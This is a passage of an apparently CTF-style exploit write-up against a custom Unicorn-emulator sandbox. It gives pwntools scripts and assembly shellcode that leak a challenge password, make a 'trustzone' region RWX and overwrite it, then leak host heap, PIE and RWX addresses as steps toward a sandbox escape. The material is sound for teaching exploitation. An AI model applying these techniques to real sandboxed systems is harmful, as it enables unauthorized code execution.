</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Welcome&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">CODE</span> <span class="o">=</span> <span class="n">shellcode</span>
</span></span><span class="line"><span class="cl"><span class="n">VA</span><span class="p">,</span> <span class="n">SIZE</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x1000</span>
</span></span><span class="line"><span class="cl"><span class="n">hdr</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">unicorn</span><span class="o">.</span><span class="n">UC_ARCH_X86</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">unicorn</span><span class="o">.</span><span class="n">UC_MODE_64</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">VA</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="n">SIZE</span><span class="p">),</span>          <span class="c1"># one RX page for code+data</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">*</span> <span class="mi">16</span><span class="p">,</span>              <span class="c1"># unused maps</span>
</span></span><span class="line"><span class="cl">    <span class="n">p16</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">CODE</span><span class="p">)),</span>              <span class="c1"># code_length</span>
</span></span><span class="line"><span class="cl">    <span class="n">p8</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                        <span class="c1"># num_maps</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;DATA_START&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">hdr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;CODE_START&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">CODE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pid 0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">password</span> <span class="si">= }</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create_map_shared_x86_64</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">create_map_shared_x86_64</span> <span class="si">= }</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">map_shared_x86_64</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">map_shared_x86_64</span> <span class="si">= }</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">memprot_x86_64</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">memprot_x86_64</span> <span class="si">= }</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;create_map_shared_x86_64&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">create_map_shared_x86_64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;map_shared_x86_64&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">map_shared_x86_64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;memprot_x86_64&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">memprot_x86_64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Leaked is written to the file&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><img src="https://i.imgur.com/wTsYS7R.png"/>
<p>As you can see, if we run the above script, we will be able to get the <code>password</code> and all of the <code>trustzones</code>. For local debugging purposes, I also stored them in files, just like how the app stores them on the server.</p>
<h4 id="leak-shared-buffers">Leak Shared Buffers</h4>
<p>Now that we can leak the password and all of the trustzones, we can debug the application locally. For the next step of exploitation, we need to consider that with the password in our hand, we can utilize the <code>memprot_x86_64</code> trustzone provided by the app to change the memory permissions of any address in our emulated process space.</p>
<p>Remember that the <code>trustzone</code> area is <strong>writeable</strong>! This means if we call <code>memprot_x86_64</code> to modify the permissions of the mapped trustzone from <code>r-x</code> to <code>rwx</code>, we can overwrite it with our own shellcode. Later on, when we call <code>trustzone_invoke</code>, our shellcode will execute with elevated privileges since it runs in <code>trustzone_mode</code>, giving us the ability to perform privileged operations.</p>
<p>Now, we want to leak something useful. I observed that in <code>validate_handle</code>, it actually returns the raw pointer of <code>shared_buffer</code>, which is an address in the host process. This means if we overwrite the <code>trustzone</code> to execute <code>validate_handle</code>, we can make the emulated program hold the address of <code>shared_buffer</code> in any register. This will be useful in the future, but for now, let&rsquo;s try to leak the <code>shared_buffer</code> pointer and store it in register <code>r12</code>. Here&rsquo;s what we want to do:</p>
<ul>
<li>Call <code>create_shared</code> syscall to insert a <code>shared_buffer</code> with handle <code>0</code> into the <code>shared_buffers</code> array.</li>
<li>Call <code>create_trustzone</code> syscall to load the available <code>memprot_x86_64</code> trustzone.</li>
<li>Call <code>trustzone_invoke</code> syscall to <code>memprot</code> our trustzone from <code>r-x</code> to <code>rwx</code>.</li>
<li>Now, because the <code>trustzone</code> area is writeable, overwrite it with our own shellcode that will:
<ul>
<li>Call <code>validate_handle</code> to fetch the <code>shared_buffer</code> address.</li>
<li>Store it in <code>r12</code> (so that we can use it later in our shellcode).</li>
<li>Print it as well with the <code>print_integer</code> syscall for debugging purposes.</li>
</ul>
</li>
</ul>
<p>It&rsquo;s time for us to modify our previous script. Below is my shellcode to do it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span>
</span></span><span class="line"><span class="cl"><span class="sa">r</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">.intel_syntax noprefix
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call create_shared */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, 0x1000
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 3
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80 # Handle 0 will be created
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call create_trustzone &#39;memprot_x86_64&#39; */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, 0x4000
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rcx, [rip + memprot_x86_64]
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 8
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Invoke memprot to map trustzone with RWX permissions */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, 0x4000
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rcx, 0x1000
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdx, 0x7
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rdi, [rip + password_str]
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 10
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Overwrite trustzone to leak shared_buffers[0].buffer address */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdi, 0x4000
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rsi, [rip+leak_shared_buffers_0]
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rcx, [rip+leak_shared_buffers_0_end]
</span></span></span><span class="line"><span class="cl"><span class="s1">sub rcx, rsi
</span></span></span><span class="line"><span class="cl"><span class="s1">rep movsb
</span></span></span><span class="line"><span class="cl"><span class="s1">/* invoke modified trustzone (which will print ptr) */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 10
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Pause so that we can debug */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 0x6
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">leak_shared_buffers_0:
</span></span></span><span class="line"><span class="cl"><span class="s1">    /* Call validate_handle 0 */
</span></span></span><span class="line"><span class="cl"><span class="s1">    xor rbx, rbx
</span></span></span><span class="line"><span class="cl"><span class="s1">    xor rcx, rcx
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 4
</span></span></span><span class="line"><span class="cl"><span class="s1">    int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r12, rax # store leaked value at r12
</span></span></span><span class="line"><span class="cl"><span class="s1">    /* Print leak for debugging purposes */
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, rax
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 0x2
</span></span></span><span class="line"><span class="cl"><span class="s1">    int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">leak_shared_buffers_0_end:
</span></span></span><span class="line"><span class="cl"><span class="s1">password_str:
</span></span></span><span class="line"><span class="cl"><span class="s1">    .ascii &#34;sup3r_s3cure_sj\0&#34;
</span></span></span><span class="line"><span class="cl"><span class="s1">memprot_x86_64:
</span></span></span><span class="line"><span class="cl"><span class="s1">    .ascii &#34;memprot_x86_64\0&#34;
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pid 0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leaked_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_addr</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This time, we will run it locally first because we want to debug it further in our local. As you can see in the image below, we have successfully leaked the pointer of the allocated <code>shared_buffer</code>.
<img src="https://i.imgur.com/pkhrtl5.png"/></p>
<p>Now, we can move to the next step of the exploitation.</p>
<h4 id="leak-pie-and-rwx">Leak PIE and RWX</h4>
<p>Now, let&rsquo;s fire up our GDB and start on checking what can we do with that leaked address. Before that, let&rsquo;s check the process memory mapping first to get undertanding on the host process memory layout.</p>
<img src ="https://i.imgur.com/ybGuadV.png"/>
<p>As we can see, there is an <code>rwx</code> area in memory. If we could leak this <code>rwx</code> address, it would be very useful for our exploit.</p>
<p>I observed that the custom <code>map_address</code> syscall allows us to map host process addresses into our emulated program space. This means our emulated program can write to any area of the host process, as long as it executes in <code>trustzone_mode</code> (which we&rsquo;ve already achieved).</p>
<p>So if we leak the <code>rwx</code> address and use the <code>map_address</code> syscall to map it, we can write our own shellcode into the host process memory, with the hope that we can later jump to and execute it.</p>
<p>Now, we can simply scan through the leaked address that we got before, whether we can leak any rwx area or not.
<img src="https://i.imgur.com/9gFLQRX.png"/></p>
<p>As you can see, from the <strong>base</strong> address of our leaked address (which is located at <code>leaked_address-0x12bf0</code>), if we map it to our emulated process space with size <code>0x2000</code>, we can actually get the <code>rwx</code> pointer.</p>
<p>Not only the <code>rwx</code> pointer, we can also leak the PIE address as well (see below image).
<img src="https://i.imgur.com/PMMzNPL.png"/></p>
<p>Now we need to craft shellcode to put in the <code>trustzone</code> area. Since the <code>trustzone</code> area is still writeable from our last step, we can overwrite it with shellcode that will:</p>
<ul>
<li>Call <code>map_address</code> to map from the base address of our leaked address up to <code>base_address+0x2000</code></li>
<li>Store the base RWX address in <code>r10</code> and base PIE address in <code>r11</code> for later use</li>
<li>Print the addresses using the <code>print_integer</code> syscall for debugging</li>
</ul>
<p>Here is the extended script building on our previous code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span>
</span></span><span class="line"><span class="cl"><span class="sa">r</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">.intel_syntax noprefix
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call create_shared */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, 0x1000
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 3
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80 # Handle 0 will be created
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call create_trustzone &#39;memprot_x86_64&#39; */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, 0x4000
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rcx, [rip + memprot_x86_64]
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 8
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Invoke memprot to map trustzone with RWX permissions */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, 0x4000
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rcx, 0x1000
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdx, 0x7
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rdi, [rip + password_str]
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 10
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Overwrite trustzone to leak shared_buffers[0].buffer address */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdi, 0x4000
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rsi, [rip+leak_shared_buffers_0]
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rcx, [rip+leak_shared_buffers_0_end]
</span></span></span><span class="line"><span class="cl"><span class="s1">sub rcx, rsi
</span></span></span><span class="line"><span class="cl"><span class="s1">rep movsb
</span></span></span><span class="line"><span class="cl"><span class="s1">/* invoke modified trustzone (which will print ptr) */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 10
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Overwrite trustzone to leak PIE and RWX address */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdi, 0x4000
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rsi, [rip+leak_pie_and_rwx]
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rcx, [rip+leak_pie_and_rwx_end]
</span></span></span><span class="line"><span class="cl"><span class="s1">sub rcx, rsi
</span></span></span><span class="line"><span class="cl"><span class="s1">rep movsb
</span></span></span><span class="line"><span class="cl"><span class="s1">/* invoke modified trustzone (which will assign PIE to r11 and RWX to r10) */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 10
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Pause so that we can debug */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 0x6
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">leak_shared_buffers_0:
</span></span></span><span class="line"><span class="cl"><span class="s1">    /* Call validate_handle 0 */
</span></span></span><span class="line"><span class="cl"><span class="s1">    xor rbx, rbx
</span></span></span><span class="line"><span class="cl"><span class="s1">    xor rcx, rcx
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 4
</span></span></span><span class="line"><span class="cl"><span class="s1">    int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r12, rax # store leaked value at r12
</span></span></span><span class="line"><span class="cl"><span class="s1">    /* Print leak for debugging purposes */
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, rax
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 0x2
</span></span></span><span class="line"><span class="cl"><span class="s1">    int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">leak_shared_buffers_0_end:
</span></span></span><span class="line"><span class="cl"><span class="s1">leak_pie_and_rwx:
</span></span></span><span class="line"><span class="cl"><span class="s1">    /* Call map_address */
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, 0x5000
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rcx, 0x2000
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rdx, r12 # r12 is shared_buffers[0]
</span></span></span><span class="line"><span class="cl"><span class="s1">    sub rdx, 0x12bf0 # map to the base of area instead of to the shared_buffers[0]
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 5
</span></span></span><span class="line"><span class="cl"><span class="s1">    int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">    /* Store leaked pie at r11 and leaked rwx at r10 */
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, 0x5000
</span></span></span><span class="line"><span class="cl"><span class="s1">    add rbx, 0x1100
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r11, qword ptr [rbx]
</span></span></span><span class="line"><span class="cl"><span class="s1">    sub r11, 0x785b20 # r11 = PIE BASE
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, 0x5000
</span></span></span><span class="line"><span class="cl"><span class="s1">    add rbx, 0x0b88
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r10, qword ptr [rbx]
</span></span></span><span class="line"><span class="cl"><span class="s1">    sub r10, 0x1c2f # r10 = RWX BASE
</span></span></span><span class="line"><span class="cl"><span class="s1">    /* Print for debugging purposes */
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, r11
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 0x2
</span></span></span><span class="line"><span class="cl"><span class="s1">    int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, r10
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 0x2
</span></span></span><span class="line"><span class="cl"><span class="s1">    int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">leak_pie_and_rwx_end:
</span></span></span><span class="line"><span class="cl"><span class="s1">password_str:
</span></span></span><span class="line"><span class="cl"><span class="s1">    .ascii &#34;sup3r_s3cure_sj\0&#34;
</span></span></span><span class="line"><span class="cl"><span class="s1">memprot_x86_64:
</span></span></span><span class="line"><span class="cl"><span class="s1">    .ascii &#34;memprot_x86_64\0&#34;
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pid 0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leaked_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_addr</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
